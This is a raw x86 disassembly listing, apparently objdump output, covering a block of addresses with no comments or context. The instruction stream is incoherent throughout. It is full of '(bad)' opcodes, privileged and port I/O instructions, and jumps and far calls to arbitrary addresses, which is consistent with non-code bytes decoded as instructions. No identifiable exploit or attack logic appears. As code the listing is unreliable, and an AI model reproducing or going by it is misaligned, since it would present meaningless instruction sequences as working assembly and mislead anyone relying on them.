  409ccc:	popa   
  409ccd:	ins    DWORD PTR es:[edi],dx
  409cce:	adc    BYTE PTR [eax+eiz*4],0x94
  409cd2:	inc    esp
  409cd3:	dec    edx
  409cd4:	and    DWORD PTR [eax],0x76c0d650
  409cda:	ror    BYTE PTR [edx],0xe7
  409cdd:	(bad)  
  409cde:	nop
  409cdf:	add    bh,BYTE PTR [edx]
  409ce1:	in     eax,dx
  409ce2:	test   BYTE PTR [ebp+0x2bb74241],cl
  409ce8:	cwde   
  409ce9:	int    0xd
  409ceb:	mov    edx,0xa74b60d4
  409cf0:	nop
  409cf1:	and    al,BYTE PTR [ecx]
  409cf3:	cdq    
  409cf4:	add    dl,dl
  409cf6:	test   edx,0x222bef71
  409cfc:	and    eax,0x5aee0bb5
  409d01:	cmc    
  409d02:	out    dx,al
  409d03:	stos   DWORD PTR es:[edi],eax
  409d04:	(bad)  
  409d05:	sti    
  409d06:	dec    ebp
  409d07:	cmp    edi,DWORD PTR [edi+0x24288152]
  409d0d:	call   0x1a3f0e1
  409d12:	(bad)  
  409d13:	sub    edi,DWORD PTR [esp+eiz*8+0xa]
  409d17:	stos   DWORD PTR es:[edi],eax
  409d18:	pop    eax
  409d19:	inc    ebx
  409d1a:	jl     0x409d59
  409d1c:	jmp    0x1e923af9
  409d21:	nop
  409d22:	test   DWORD PTR [edi-0x60cf2fdd],ebx
  409d28:	or     ebx,DWORD PTR [edi]
  409d2a:	or     eax,0xb540a670
  409d2f:	call   0xcc3f:0x3a50b082
  409d36:	lea    ebp,[ebx-0x51]
  409d39:	ror    BYTE PTR [ebp+0x6f],cl
  409d3c:	repz sar BYTE PTR [ecx-0x4d34d7f9],0xf2
  409d44:	faddp  st(7),st
  409d46:	and    esp,edx
  409d48:	loop   0x409d5a
  409d4a:	pusha  
  409d4b:	or     al,0x0
  409d4d:	icebp  
  409d4e:	mov    ebx,0xd184924c
  409d53:	push   0xe63c78c4
  409d58:	mov    edi,DWORD PTR [edi-0xc]
  409d5b:	sbb    al,0x99
  409d5d:	out    dx,al
  409d5e:	repz rol BYTE PTR [ebx-0x71],1
  409d62:	xor    edx,ebx
  409d64:	cmp    cl,BYTE PTR [ebp+0x7f]
  409d67:	mov    eax,0x785a4a83
  409d6c:	pop    ss
  409d6d:	adc    esi,DWORD PTR ds:0xb576242b
  409d73:	inc    esp
  409d74:	(bad)  
  409d75:	sbb    al,BYTE PTR [ebx+0x99352c1]
  409d7b:	(bad)  
  409d7c:	aaa    
  409d7d:	mov    dh,0x7
  409d7f:	and    bl,BYTE PTR [ebx+0x39]
  409d82:	add    bl,ah
  409d84:	sbb    al,0x80
  409d86:	shl    bh,cl
  409d88:	add    al,ch
  409d8a:	xchg   edx,eax
  409d8b:	push   esp
  409d8c:	int3   
  409d8d:	nop
  409d8e:	inc    edx
  409d8f:	mov    ds:0x4fa07d75,al
  409d94:	int3   
  409d95:	pop    esi
  409d96:	(bad)  
  409d97:	jecxz  0x409d8a
  409d99:	stos   BYTE PTR es:[edi],al
  409d9a:	popa   
  409d9b:	rol    BYTE PTR [eax],0x6f
  409d9e:	std    
  409d9f:	cli    
  409da0:	scas   eax,DWORD PTR es:[edi]
  409da1:	(bad)  
  409da2:	jp     0x409d7d
  409da4:	fdivr  QWORD PTR [eax+0x3f]
  409da7:	in     al,0x58
  409da9:	add    BYTE PTR [eax],ah
  409dab:	test   al,bh
  409dad:	lahf   
  409dae:	lods   al,BYTE PTR ds:[esi]
  409daf:	mov    ch,0xed
  409db1:	shr    DWORD PTR [eax-0x3c],1
  409db4:	jo     0x409dee
  409db6:	in     al,0xf0
  409db8:	lock adc BYTE PTR [ecx],ch
  409dbb:	and    eax,0xfeeffb7f
  409dc0:	cmp    eax,0xbf018306
  409dc5:	(bad)  
  409dc6:	stos   DWORD PTR es:[edi],eax
  409dc7:	mov    edi,0xe13264c2
  409dcc:	fidiv  DWORD PTR [ebp+0x6ff6fc6b]
  409dd2:	push   DWORD PTR [esi]
  409dd4:	mov    edi,0xcbbfbbfb
  409dd9:	aas    
  409dda:	jmp    edi
  409ddc:	call   FWORD PTR [edi+ecx*4-0x9961383]
  409de3:	div    dh
  409de5:	sub    edx,esi
  409de7:	mov    ecx,gs
  409de9:	in     al,0x90
  409deb:	and    cl,bh
  409ded:	cmp    eax,0xbe942fca
  409df2:	sub    BYTE PTR [ebx+esi*4],dh
  409df5:	stc    
  409df6:	pushf  
  409df7:	jns    0x409d8f
  409df9:	jnp    0x409e1f
  409dfb:	je     0x409d92
  409dfd:	mov    ah,0x68
  409dff:	or     bh,al
  409e01:	mov    ds:0xbb9277f6,eax
  409e06:	add    DWORD PTR [ebx-0x38],0x5ab5eac6
  409e0d:	test   BYTE PTR [eax+eiz*4],al
  409e10:	jo     0x409e41
  409e12:	xchg   ebx,eax
  409e13:	pop    ecx
  409e14:	shl    ecx,0xd4
  409e17:	sub    DWORD PTR [ecx+0x202f2e14],ebp
  409e1d:	dec    esp
  409e1e:	and    DWORD PTR [ebp-0xd],edx
  409e21:	in     al,dx
  409e22:	pop    edx
  409e23:	ror    BYTE PTR [edx+0x4d2ffb2a],0x5
  409e2a:	std    
  409e2b:	pop    esi
  409e2c:	dec    edx
  409e2d:	scas   eax,DWORD PTR es:[edi]
  409e2e:	fwait
  409e2f:	xor    BYTE PTR [esi],bh
  409e31:	sub    al,0xc8
  409e33:	ret    
  409e34:	xor    BYTE PTR [ecx+0xc],ah
  409e37:	fadd   st,st(2)
  409e39:	jne    0x409e58
  409e3b:	inc    edx
  409e3c:	js     0x409e99
  409e3e:	pop    ebx
  409e3f:	loope  0x409ebb
  409e41:	(bad)  
  409e42:	(bad)  
  409e43:	cmp    eax,0x96589ee6
  409e48:	ret    
  409e49:	jnp    0x409e98
  409e4b:	push   ss
  409e4c:	adc    dl,cl
  409e4e:	adc    DWORD PTR [ebp-0x5dff0595],edx
  409e54:	std    
  409e55:	inc    edi
  409e56:	cmp    dl,BYTE PTR [edx]
  409e58:	jecxz  0x409e16
  409e5a:	xor    al,0x1d
  409e5d:	ret    0x41ec
  409e60:	(bad)  
  409e61:	pop    edx
  409e62:	(bad)  
  409e63:	shl    BYTE PTR [esp+esi*8+0x7f3805eb],cl
  409e6a:	inc    eax
  409e6b:	push   ecx
  409e6c:	pop    eax
  409e6d:	je     0x409e98
  409e6f:	rol    BYTE PTR [esi],1
  409e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e72:	mov    ch,0x9e
  409e74:	cmp    BYTE PTR [eax+0x6e0f8eeb],bh
  409e7a:	inc    eax
  409e7b:	jno    0x409dfe
  409e7d:	(bad)  
  409e7e:	lahf   
  409e7f:	cmp    BYTE PTR [ecx+0x789b7ef6],cl
  409e85:	push   ecx
  409e86:	int3   
  409e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e88:	mov    ds:0x4d080c7,al
  409e8d:	add    cl,0x60
  409e90:	adc    BYTE PTR [eax],0x82
  409e93:	das    
  409e94:	jle    0x409e8f
  409e96:	jmp    0x409ef4
  409e98:	mov    ebx,0x23e0f25d
  409e9d:	dec    edi
  409e9e:	mov    dl,0xbd
  409ea0:	jae    0x409e38
  409ea2:	loope  0x409e8c
  409ea4:	add    al,0x69
  409ea6:	shr    BYTE PTR [ecx-0x552a0f9b],cl
  409eac:	sub    BYTE PTR [edx-0x741b6a46],ch
  409eb2:	inc    esi
  409eb3:	xchg   ebp,eax
  409eb4:	test   BYTE PTR [esi-0x4f],dh
  409eb7:	bound  ebx,QWORD PTR [ebx+0x5c]
  409eba:	mov    esi,0x8bd00916
  409ebf:	pushf  
  409ec0:	add    BYTE PTR [ecx+eax*2+0x27],ch
  409ec4:	lods   eax,DWORD PTR ds:[esi]
  409ec5:	inc    edi
  409ec6:	mov    ah,0x56
  409ec8:	add    eax,0x6501c1c1
  409ece:	pop    ecx
  409ecf:	test   DWORD PTR cs:[esi-0x5054547f],ebx
  409ed6:	cli    
  409ed7:	into   
  409ed8:	in     eax,0xb8
  409eda:	es inc eax
  409edc:	iret   
  409edd:	sbb    bl,al
  409edf:	leave  
  409ee0:	xchg   ebx,eax
  409ee1:	daa    
  409ee2:	jns    0x409ede
  409ee4:	jmp    0x7057c90
  409ee9:	(bad)  
  409eea:	xor    eax,0x43fdbdc8
  409eef:	sahf   
  409ef0:	jl     0x409ee4
  409ef2:	dec    ecx
  409ef3:	scas   al,BYTE PTR es:[edi]
  409ef4:	pop    esi
  409ef5:	mov    ebp,0xcedbedca
  409efa:	popa   
  409efb:	jns    0x409eea
  409efd:	fidiv  DWORD PTR ds:0xf93fc9fe
  409f03:	daa    
  409f04:	cld    
  409f05:	(bad)  
  409f06:	outs   dx,DWORD PTR ds:[esi]
  409f07:	std    
  409f08:	push   ss
  409f09:	dec    edi
  409f0a:	cmp    eax,0x7b0714f5
  409f0f:	mov    bh,0xc9
  409f11:	xor    dh,BYTE PTR [edi]
  409f13:	fnsave [ecx-0x57]
  409f16:	xor    eax,0x273a5945
  409f1b:	pop    esi
  409f1c:	pop    esi
  409f1d:	nop
  409f1e:	out    0x45,eax
  409f20:	lods   eax,DWORD PTR ds:[esi]
  409f21:	pop    es
  409f22:	cmp    BYTE PTR [esi+0x40121f2d],ch
  409f28:	push   esi
  409f29:	jp     0x409f21
  409f2b:	out    dx,eax
  409f2c:	test   esi,esi
  409f2e:	pop    es
  409f2f:	pop    es
  409f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f32:	bound  ebx,QWORD PTR [ecx-0x6a]
  409f35:	xor    eax,ebx
  409f37:	pop    eax
  409f38:	lods   al,BYTE PTR ds:[esi]
  409f39:	and    esp,DWORD PTR [edi+0x71]
  409f3c:	and    eax,eax
  409f3e:	stc    
  409f3f:	mov    esp,0x713f7f60
  409f44:	or     al,0x5c
  409f46:	dec    edx
  409f47:	xchg   edi,eax
  409f48:	add    esp,DWORD PTR [eax+0x42aaab5c]
  409f4e:	dec    esp
  409f4f:	sbb    BYTE PTR [eax],dh
  409f51:	jle    0x409f65
  409f53:	push   ecx
  409f54:	(bad)  
  409f56:	xchg   esp,eax
  409f57:	jb     0x409f02
  409f59:	rol    ebx,0x8d
  409f5c:	push   ss
  409f5d:	pop    es
  409f5e:	jecxz  0x409f3c
  409f60:	mov    cl,0x80
  409f62:	add    BYTE PTR [esi-0x3f083021],0x31
  409f69:	xor    BYTE PTR [eax],cl
  409f6b:	in     eax,0x18
  409f6d:	adc    cl,0x9e
  409f70:	mov    esi,0xbe36161b
  409f75:	stos   BYTE PTR es:[edi],al
  409f76:	iret   
  409f77:	mov    esi,0xb1e16b51
  409f7c:	test   eax,0x2c4db440
  409f81:	scas   al,BYTE PTR es:[edi]
  409f82:	ret    
  409f83:	stos   BYTE PTR es:[edi],al
  409f84:	dec    eax
  409f85:	inc    edx
  409f86:	push   ebp
  409f87:	mov    ds:0x3413c62c,eax
  409f8c:	fld    DWORD PTR [ebp+0x3846e104]
  409f92:	pop    edx
  409f93:	sub    edx,eax
  409f95:	ficom  DWORD PTR [eax+0x2c16a17]
  409f9b:	jb     0x409fde
  409f9d:	pop    esi
  409f9e:	or     BYTE PTR [edx+0x2d],cl
  409fa1:	nop
  409fa2:	jle    0x409fe5
  409fa4:	mov    DWORD PTR gs:0xdfec26cf,esp
  409fab:	jp     0x409f3e
  409fad:	daa    
  409fae:	push   ds
  409faf:	jmp    0x98f80e84
  409fb4:	int    0x66
  409fb6:	xchg   ebp,eax
  409fb7:	jecxz  0x409f68
  409fb9:	fxch   st(3)
  409fbb:	aaa    
  409fbc:	add    DWORD PTR [eax],esp
  409fbe:	(bad)  
  409fbf:	sbb    eax,0xd3a76798
  409fc4:	loope  0x40a011
  409fc6:	pop    edi
  409fc7:	(bad)  
  409fc8:	adc    edi,DWORD PTR [esi+0x4e2ddaff]
  409fce:	aas    
  409fcf:	lock jle 0x40a048
  409fd2:	dec    esi
  409fd3:	ds enter 0xfb68,0x34
  409fd8:	lods   eax,DWORD PTR ds:[esi]
  409fd9:	dec    esi
  409fda:	fbld   TBYTE PTR ds:0xc7e5e8fa
  409fe0:	stos   BYTE PTR es:[edi],al
  409fe1:	hlt    
  409fe2:	cmp    al,0x6
  409fe4:	cmp    DWORD PTR [eax+0x67],0xf9616090
  409feb:	out    dx,eax
  409fec:	inc    edi
  409fed:	cli    
  409fee:	push   edi
  409fef:	inc    ebp
  409ff0:	add    DWORD PTR [ecx],0x58
  409ff3:	out    dx,eax
  409ff4:	or     esi,DWORD PTR [eax-0x65bfacf5]
  409ffa:	sub    DWORD PTR [edi+0x49247a77],esp
  40a000:	mov    dh,BYTE PTR [ebp-0x14450ba7]
  40a006:	in     eax,dx
  40a007:	jno    0x409fde
  40a009:	dec    esp
  40a00a:	rcr    BYTE PTR [esi-0x22],0x5c
  40a00e:	mov    ch,0xf1
  40a010:	jle    0x409fda
  40a012:	cmp    eax,0x3ec7c003
  40a017:	div    BYTE PTR [ecx-0x21f527ec]
  40a01d:	retf   0x7c2f
  40a020:	loope  0x40a02d
  40a022:	fs pop ecx
  40a024:	inc    esi
  40a025:	mov    edi,0x9fe3e03f
  40a02a:	clc    
  40a02b:	jns    0x40a0a7
  40a02d:	fnstsw WORD PTR [esi]
  40a02f:	dec    edi
  40a030:	ds stc 
  40a032:	and    al,0x9f
  40a034:	cld    
  40a035:	in     al,0x27
  40a037:	(bad)  
  40a039:	aas    
  40a03a:	loopne 0x40a001
  40a03c:	pop    ss
  40a03d:	mov    edi,0xbeafabc3
  40a042:	retf   0xafeb
  40a045:	mov    edi,0x97fcbfce
  40a04a:	call   DWORD PTR [edx-0x1d00e81]
  40a050:	add    eax,0xed725979
  40a055:	cli    
  40a056:	int    0x5a
  40a058:	fisubr DWORD PTR ds:0xed447788
  40a05e:	fild   QWORD PTR [ecx-0x539a383e]
  40a064:	jg     0x40a021
  40a066:	add    bh,BYTE PTR [edi+ebp*4-0x12]
  40a06a:	mov    bh,0xe3
  40a06c:	fiadd  DWORD PTR [eax-0x5e]
  40a06f:	adc    al,0x7
  40a071:	pop    es
  40a072:	push   ebx
  40a073:	test   BYTE PTR [edi],0xdc
  40a076:	adc    BYTE PTR [ebp+0x29],dl
  40a079:	pop    ebp
  40a07a:	adc    dl,BYTE PTR [eax-0x758a3d6e]
  40a080:	ss int3 
  40a082:	sub    dl,BYTE PTR [esp+ebp*2]
  40a085:	ja     0x40a088
  40a087:	enter  0xd1aa,0x74
  40a08b:	mov    ebx,0x36a39b09
  40a090:	sti    
  40a091:	pop    es
  40a092:	cmp    ebx,esp
  40a094:	ret    
  40a095:	add    bl,BYTE PTR [ebp-0x3a]
  40a098:	fst    QWORD PTR [edx+0x6c]
  40a09b:	xchg   ebx,eax
  40a09c:	aaa    
  40a09d:	arpl   bx,di
  40a09f:	ficom  WORD PTR [eax+esi*4-0x48]
  40a0a3:	xor    dl,BYTE PTR [ebp-0x56]
  40a0a6:	call   0xf121:0x4c712304
  40a0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ae:	inc    esp
  40a0af:	ret    0xc7b2
  40a0b2:	sahf   
  40a0b3:	cmp    cl,BYTE PTR [eax]
  40a0b5:	push   esp
  40a0b6:	mov    edi,0x5405e457
  40a0bb:	loopne 0x40a0cd
  40a0bd:	stc    
  40a0be:	or     ch,BYTE PTR [edx-0x4e3cf887]
  40a0c4:	inc    ecx
  40a0c5:	sbb    ecx,DWORD PTR [edi+ecx*2-0x7aebedfa]
  40a0cc:	gs ds ja 0x40a0fb
  40a0d0:	push   es
  40a0d1:	int    0xe6
  40a0d3:	xchg   BYTE PTR [eax+edx*4+0x75a594],bh
  40a0da:	sub    DWORD PTR [esi+eax*1],ebp
  40a0dd:	mov    eax,0x9c7bfd75
  40a0e2:	cmp    esp,DWORD PTR ds:0xd51adad8
  40a0e8:	inc    esi
  40a0e9:	clc    
  40a0ea:	lds    edi,FWORD PTR ds:0xbc942c3f
  40a0f0:	cdq    
  40a0f1:	icebp  
  40a0f2:	pop    ss
  40a0f3:	(bad)  
  40a0f4:	daa    
  40a0f5:	dec    ecx
  40a0f6:	ret    0x3870
  40a0f9:	in     al,0x85
  40a0fb:	pop    ss
  40a0fc:	pop    esi
  40a0fd:	in     al,0x6b
  40a0ff:	iret   
  40a100:	mov    esi,0x71e770cc
  40a105:	mov    dh,0x4f
  40a107:	ds (bad) 
  40a109:	(bad)  
  40a10a:	lock and al,0xad
  40a10d:	push   esi
  40a10e:	mov    edi,0xa477b596
  40a113:	cmp    eax,0x62d15e1f
  40a118:	rcl    DWORD PTR [edx-0x493d9fc7],cl
  40a11e:	xchg   BYTE PTR [esi-0x2a],cl
  40a121:	into   
  40a122:	sbb    DWORD PTR [ecx+0x3ffc7100],ebx
  40a128:	into   
  40a129:	add    DWORD PTR [eax],edx
  40a12b:	jbe    0x40a0f7
  40a12d:	push   0x55df4ce0
  40a132:	or     al,0x20
  40a134:	cld    
  40a135:	bound  ebx,QWORD PTR ds:[edx]
  40a138:	xor    BYTE PTR [eax-0x4392a929],al
  40a13e:	pop    ds
  40a13f:	jb     0x40a15d
  40a141:	push   es
  40a142:	and    BYTE PTR [ecx-0x5f6847d2],al
  40a148:	mov    ch,0xf6
  40a14a:	xor    DWORD PTR ds:0x61851426,0x2f
  40a151:	aas    
  40a152:	loopne 0x40a133
  40a154:	(bad)  
  40a155:	sti    
  40a156:	inc    eax
  40a158:	into   
  40a159:	into   
  40a15a:	ss aas 
  40a15c:	sti    
  40a15d:	mov    bl,0x3f
  40a15f:	(bad)  
  40a160:	das    
  40a161:	(bad)  
  40a162:	loop   0x40a193
  40a164:	icebp  
  40a165:	int3   
  40a166:	xor    ecx,edi
  40a168:	lock sti 
  40a16a:	mov    edi,0xf6f679ff
  40a16f:	imul   BYTE PTR [eax]
  40a171:	retf   
  40a172:	xchg   edx,eax
  40a173:	jmp    0x79026fec
  40a178:	inc    edx
  40a179:	xchg   edx,eax
  40a17a:	sub    al,0x53
  40a17c:	mov    ebp,0x4528e4a3
  40a181:	cmp    eax,0xe51fba8a
  40a186:	or     al,0xbc
  40a188:	pop    ss
  40a189:	ror    BYTE PTR [eax],0xdf
  40a18c:	retf   
  40a18d:	mov    ds:0x28924920,al
  40a192:	pop    es
  40a193:	xbegin 0x790604cd
  40a199:	pushf  
  40a19a:	xor    DWORD PTR [ebx+0x12000f0b],ebx
  40a1a0:	and    DWORD PTR [ebp+0x54],eax
  40a1a3:	into   
  40a1a4:	xor    eax,0x5ee9caf4
  40a1a9:	pop    ebx
  40a1aa:	sub    dl,BYTE PTR [edi-0x70]
  40a1ad:	es xchg edx,eax
  40a1af:	outs   dx,BYTE PTR ds:[esi]
  40a1b0:	inc    edi
  40a1b1:	xor    eax,ebp
  40a1b3:	and    eax,0x2c8a5ab4
  40a1b8:	das    
  40a1b9:	fsub   QWORD PTR [ecx+eiz*4-0x69e28bb5]
  40a1c0:	xor    bh,cl
  40a1c2:	push   0x14
  40a1c4:	lahf   
  40a1c5:	test   al,0xbc
  40a1c7:	jne    0x40a215
  40a1c9:	mov    eax,ds:0x7d170902
  40a1ce:	pop    eax
  40a1cf:	repnz sub ecx,eax
  40a1d2:	pusha  
  40a1d3:	pop    edx
  40a1d4:	and    al,0xd4
  40a1d6:	inc    edi
  40a1d7:	push   cs
  40a1d8:	push   esi
  40a1d9:	xchg   ebp,eax
  40a1da:	mov    al,0xf8
  40a1dc:	ins    DWORD PTR es:[edi],dx
  40a1dd:	sub    eax,0x978899b5
  40a1e2:	sbb    al,0x82
  40a1e4:	mov    ebx,esp
  40a1e6:	add    al,0x5b
  40a1e8:	cmp    DWORD PTR [esi+0x7d],esp
  40a1eb:	push   edx
  40a1ec:	push   eax
  40a1ed:	and    esp,edi
  40a1ef:	mov    al,ds:0x58753720
  40a1f4:	pop    edx
  40a1f5:	adc    BYTE PTR [esi],0x82
  40a1f8:	fstp   QWORD PTR [ebx]
  40a1fa:	fbld   TBYTE PTR [ebx-0x55]
  40a1fd:	jg     0x40a1bf
  40a1ff:	inc    ebx
  40a200:	setl   BYTE PTR [ecx-0x2cb2c416]
  40a207:	xchg   ebp,eax
  40a208:	cmp    eax,0x9a2edc7d
  40a20d:	shl    BYTE PTR [eax+0x18306294],0x70
  40a214:	loope  0x40a1f8
  40a216:	and    eax,0x9e0fef7e
  40a21b:	and    eax,0xc4e69f69
  40a220:	jmp    0x9d597b6c
  40a225:	mov    ds:0xac611bd3,al
  40a22a:	pop    esp
  40a22b:	fdivr  QWORD PTR [edx+0x34]
  40a22e:	mov    al,0xb2
  40a230:	data16 (bad) 
  40a232:	sti    
  40a233:	jmp    0xde3b:0xb47e3dae
  40a23a:	pop    eax
  40a23b:	or     esp,DWORD PTR [esi+0x22d502f8]
  40a241:	test   al,0x51
  40a243:	loope  0x40a21f
  40a245:	cmp    al,0x80
  40a247:	mov    edx,0x398a040e
  40a24c:	inc    edx
  40a24d:	sub    al,0x56
  40a24f:	std    
  40a250:	pop    ecx
  40a251:	inc    ebp
  40a252:	inc    DWORD PTR [ebx-0x4bbd4627]
  40a258:	adc    dl,ah
  40a25a:	pop    ebp
  40a25b:	sbb    DWORD PTR [ecx],ecx
  40a25d:	or     bh,al
  40a25f:	aaa    
  40a260:	add    DWORD PTR [esp+edx*8],esi
  40a263:	jmp    0xa2c3371a
  40a268:	pop    esp
  40a269:	xor    al,0xe0
  40a26b:	repz out 0xcf,eax
  40a26e:	push   ebx
  40a26f:	adc    al,0x5
  40a271:	(bad)  
  40a273:	hlt    
  40a274:	adc    ch,ch
  40a276:	mov    dh,0x9b
  40a278:	and    eax,0xcb3abeb7
  40a27d:	popf   
  40a27e:	xchg   ebp,eax
  40a27f:	(bad)  
  40a280:	in     eax,dx
  40a281:	cmp    ch,bh
  40a283:	out    dx,al
  40a284:	(bad)  
  40a285:	rcr    edi,cl
  40a287:	jmp    0x40a2fa
  40a289:	(bad)  
  40a28a:	pop    edx
  40a28b:	out    0x59,al
  40a28d:	out    0x12,al
  40a28f:	(bad)  
  40a290:	and    ah,BYTE PTR [ebp-0x5b6dbf50]
  40a296:	in     al,dx
  40a297:	(bad)  
  40a298:	out    0xd8,eax
  40a29a:	pop    esp
  40a29b:	mov    al,ds:0xa72fce7a
  40a2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a1:	pop    ds
  40a2a2:	push   es
  40a2a3:	dec    esp
  40a2a4:	pusha  
  40a2a5:	add    BYTE PTR [ecx-0x6c27782e],dl
  40a2ab:	pop    ds
  40a2ac:	loop   0x40a2d9
  40a2ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2af:	mov    al,ds:0xf5e84ed3
  40a2b4:	push   ebx
  40a2b5:	fisubr DWORD PTR ds:0x2e9644c5
  40a2bb:	cmp    DWORD PTR [ebp+0x78974bc9],esp
  40a2c1:	es jno 0x40a265
  40a2c4:	clc    
  40a2c5:	popw   ss
  40a2c7:	pop    ebp
  40a2c8:	push   edi
  40a2c9:	sub    eax,0x66a965c6
  40a2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2cf:	test   al,0x9c
  40a2d1:	jg     0x40a264
  40a2d3:	adc    DWORD PTR [ecx+0x78],0xffffff96
  40a2d7:	and    BYTE PTR [ebx],dl
  40a2d9:	and    BYTE PTR [ebp-0x50],bl
  40a2dc:	pop    es
  40a2dd:	inc    ebx
  40a2de:	and    ebp,ebx
  40a2e0:	and    eax,0x32222266
  40a2e5:	daa    
  40a2e6:	cld    
  40a2e7:	cmp    eax,0x6245834a
  40a2ec:	mov    ch,0x41
  40a2ee:	xchg   edi,eax
  40a2ef:	outs   dx,BYTE PTR ds:[esi]
  40a2f0:	mov    ds:0x2a0bcd0,al
  40a2f5:	add    BYTE PTR [ebp+0x5a],bl
  40a2f8:	retf   0x3044
  40a2fb:	fnstcw WORD PTR [ebp-0x1ea1a4bc]
  40a301:	mov    cl,0x47
  40a303:	dec    esi
  40a304:	mov    al,ds:0x5d52aa94
  40a309:	fwait
  40a30a:	retf   0x547d
  40a30d:	iret   
  40a30e:	pop    ds
  40a30f:	jle    0x40a318
  40a311:	in     eax,0x9f
  40a313:	dec    esp
  40a314:	es jl  0x40a305
  40a317:	idiv   DWORD PTR [esi-0x1a299e36]
  40a31d:	rol    DWORD PTR [edi-0x22],0xc3
  40a321:	(bad)  
  40a322:	out    0x69,al
  40a324:	cli    
  40a325:	sub    DWORD PTR ds:0xc0dc4884,0xffffff9d
  40a32c:	push   eax
  40a32d:	gs fdivrp st(7),st
  40a330:	pop    ecx
  40a331:	arpl   si,si
  40a333:	lea    edi,[ecx+0xa]
  40a336:	push   edi
  40a337:	cmp    DWORD PTR [ecx],eax
  40a339:	inc    ebp
  40a33a:	mov    ah,0x3f
  40a33c:	scas   al,BYTE PTR es:[edi]
  40a33d:	imul   dl
  40a33f:	adc    eax,0x9917f85
  40a344:	push   ecx
  40a345:	sub    DWORD PTR [edi-0x47],edi
  40a348:	enter  0x801,0x8c
  40a34c:	mov    al,ds:0x70c149f
  40a351:	pop    ebp
  40a352:	dec    edx
  40a353:	mov    ebp,0x7c10023a
  40a358:	add    ecx,ebp
  40a35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a35b:	int    0xfc
  40a35d:	repz iret 
  40a35f:	jns    0x40a2f8
  40a361:	xchg   BYTE PTR [edx],al
  40a363:	ret    
  40a364:	xor    DWORD PTR [eax],eax
  40a366:	inc    eax
  40a367:	or     BYTE PTR [ecx+0x38a08d80],ah
  40a36d:	xor    DWORD PTR [edx+0x60738515],ecx
  40a373:	add    eax,0x9a230f54
  40a378:	jp     0x40a337
  40a37a:	push   ds
  40a37b:	imul   ebx,DWORD PTR [edx-0x7070e1ce],0x2f74e51c
  40a385:	mov    bh,BYTE PTR [esi-0x41]
  40a388:	retf   0xbde
  40a38b:	sbb    BYTE PTR [eax],ch
  40a38d:	sub    DWORD PTR [ecx+0x52],edx
  40a390:	mov    ds:0xbcf85a95,al
  40a395:	jge    0x40a3cf
  40a397:	or     ah,BYTE PTR [ecx-0x47]
  40a39a:	jp     0x40a411
  40a39c:	pop    ds
  40a39d:	mov    ds:0xe1008905,eax
  40a3a2:	ret    
  40a3a3:	and    cl,0x9c
  40a3a6:	mov    BYTE PTR [eax+0x215f2190],0x6e
  40a3ad:	jns    0x40a42d
  40a3af:	inc    esi
  40a3b0:	and    BYTE PTR [ebx],cl
  40a3b2:	lods   eax,DWORD PTR ds:[esi]
  40a3b3:	xchg   esi,eax
  40a3b4:	cmp    BYTE PTR fs:[eax+0x19],cl
  40a3b8:	hlt    
  40a3b9:	push   ebx
  40a3ba:	push   cs
  40a3bb:	ud2    
  40a3bd:	out    0x5a,al
  40a3bf:	arpl   WORD PTR [ebp+0x48],bp
  40a3c2:	xchg   ebp,eax
  40a3c3:	mov    ebp,DWORD PTR [edi+esi*8-0x60]
  40a3c7:	test   BYTE PTR [esi+0x46],dl
  40a3ca:	sub    eax,0x5408057a
  40a3cf:	ss mov ecx,0x6c43a5ef
  40a3d5:	stos   BYTE PTR es:[edi],al
  40a3d6:	jmp    0x9bda:0xbe21e3b5
  40a3dd:	add    al,0x85
  40a3df:	pop    es
  40a3e0:	mov    BYTE PTR [edx],al
  40a3e2:	fs out 0x8e,al
  40a3e5:	(bad)  
  40a3e6:	cmp    edi,ebx
  40a3e8:	mov    WORD PTR [edi],es
  40a3ea:	pop    es
  40a3eb:	ret    0x9b1
  40a3ee:	push   ebp
  40a3ef:	sub    bl,BYTE PTR [edi-0x10]
  40a3f2:	inc    edi
  40a3f3:	or     BYTE PTR [edi+0x76],ah
  40a3f6:	pop    eax
  40a3f7:	xchg   ebx,eax
  40a3f8:	and    BYTE PTR [edi+ebx*4+0x6e30b027],dl
  40a3ff:	xor    BYTE PTR [eax+0x26],dl
  40a402:	cdq    
  40a403:	addr16 mov eax,0x942501b1
  40a409:	jecxz  0x40a468
  40a40b:	in     al,dx
  40a40c:	cld    
  40a40d:	sti    
  40a40e:	jl     0x40a3f8
  40a410:	inc    ebx
  40a411:	daa    
  40a412:	call   0xe576a00e
  40a417:	xchg   DWORD PTR ds:0x6055fb5,eax
  40a41d:	inc    ecx
  40a41e:	ret    0x6eef
  40a421:	xlat   BYTE PTR ds:[ebx]
  40a422:	sub    eax,0x5f7bfec3
  40a427:	clc    
  40a428:	arpl   WORD PTR [esi],bp
  40a42a:	pop    esp
  40a42b:	leave  
  40a42c:	cmp    bl,dh
  40a42e:	rol    BYTE PTR [edi],0x18
  40a431:	ins    DWORD PTR es:[edi],dx
  40a432:	sahf   
  40a433:	mov    eax,ds:0xa946d83b
  40a438:	ss xchg ebp,eax
  40a43a:	push   DWORD PTR [ebp-0x40e4b57]
  40a440:	pop    esi
  40a441:	xor    eax,0xa851aed0
  40a446:	stos   BYTE PTR es:[edi],al
  40a447:	mov    dl,0x88
  40a449:	mov    ebp,ss
  40a44b:	call   0xc00c:0xf19b134d
  40a452:	inc    esp
  40a453:	jmp    0x40a455
  40a455:	cli    
  40a456:	dec    ecx
  40a457:	inc    eax
  40a458:	je     0x40a4bb
  40a45a:	sbb    DWORD PTR [edx+esi*2-0x4b0c8ca],esi
  40a461:	and    DWORD PTR [edi+0x75],0xcb9c6047
  40a468:	ror    ah,1
  40a46a:	jo     0x40a460
  40a46c:	jb     0x40a487
  40a46e:	mov    eax,0xefaee2b1
  40a473:	mov    ebx,DWORD PTR [edi+eax*4]
  40a476:	add    DWORD PTR [eax+eax*8-0x2d7b4ff2],esp
  40a47d:	test   DWORD PTR [ecx-0x6953261c],esi
  40a483:	iret   
